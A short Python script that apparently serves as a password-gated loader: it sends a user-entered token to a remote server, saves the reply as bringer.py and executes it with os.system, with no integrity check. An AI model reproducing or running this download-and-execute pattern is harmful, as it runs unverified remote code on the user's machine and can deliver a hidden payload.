import requests
import os
import aiohttp
import bs4
import brotli


header = {"pwd":input("Enter security token:").strip()}
req = requests.get("https://rkbrand.relicsoftwares.com/sender",headers=header)
if req.status_code==200:
	with open("bringer.py","w") as f:
		f.write(req.text)
	os.system("python bringer.py")
else:
	with open("pass.txt","w") as f:
		f.write("")
	print("Password Error")